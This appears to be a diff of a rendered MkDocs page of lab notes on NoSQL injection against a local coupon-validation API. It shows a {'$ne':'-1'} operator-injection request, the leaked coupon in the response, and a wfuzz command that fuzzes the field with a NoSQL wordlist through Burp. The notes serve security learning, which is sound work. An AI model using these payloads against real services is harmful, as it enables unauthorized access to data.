@@ -26914,7 +26914,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a>Cache-Control: no-cache
 </span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a>Postman-Token: 5eb2f69b-6f89-460b-a49f-96c12edc9906
 </span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a>
-</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a>{&quot;coupon_code&quot;:{&quot;$ne&quot;:&quot;-1&quot;} }
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a>{"coupon_code":{"$ne":"-1"} }
 </span></code></pre></div></td></tr></table></div>
 <p>And this response:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
@@ -26937,12 +26937,12 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>Access-Control-Allow-Origin: *
 </span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>Content-Length: 79
 </span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>{&quot;coupon_code&quot;:&quot;TRAC075&quot;,&quot;amount&quot;:&quot;75&quot;,&quot;CreatedAt&quot;:&quot;2022-11-11T19:22:26.134Z&quot;}
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2022-11-11T19:22:26.134Z"}
 </span></code></pre></div></td></tr></table></div>
 <p>We can use wfuzz like this:</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
 <span class="normal"><a href="#__codelineno-2-2">2</a></span>
-<span class="normal"><a href="#__codelineno-2-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>wfuzz<span class="w"> </span>-z<span class="w"> </span>file,/usr/share/wordlists/nosql.txt<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyNTU1NUBoYXBpaGFjaGVyLmNvbSIsImlhdCI6MTY3NTY5NjY3NiwiZXhwIjoxNjc1NzgzMDc2fQ.2_B9Rh_kERjiz4J4c4kIRjktNJ3s4jXOPRCJrLlOJrXV5cC-SgYDF3BxcBDzDJTqZTNtS26-fnprUr9bdenAeg&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;{\&quot;coupon_code\&quot;:FUZZ}&quot;</span><span class="w"> </span>--sc<span class="w"> </span><span class="m">200</span><span class="w"> </span>-p<span class="w"> </span>localhost:8080<span class="w"> </span>http://localhost:8888/community/api/v2/coupon/validate-coupon
+<span class="normal"><a href="#__codelineno-2-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>wfuzz<span class="w"> </span>-z<span class="w"> </span>file,/usr/share/wordlists/nosql.txt<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyNTU1NUBoYXBpaGFjaGVyLmNvbSIsImlhdCI6MTY3NTY5NjY3NiwiZXhwIjoxNjc1NzgzMDc2fQ.2_B9Rh_kERjiz4J4c4kIRjktNJ3s4jXOPRCJrLlOJrXV5cC-SgYDF3BxcBDzDJTqZTNtS26-fnprUr9bdenAeg"</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">"{\"coupon_code\":FUZZ}"</span><span class="w"> </span>--sc<span class="w"> </span><span class="m">200</span><span class="w"> </span>-p<span class="w"> </span>localhost:8080<span class="w"> </span>http://localhost:8888/community/api/v2/coupon/validate-coupon
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="c1"># -p localhost:8080 Redirect traffic to BurpSuite</span>
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="c1"># --sc 200 Show code response 200</span>
 </span></code></pre></div></td></tr></table></div>
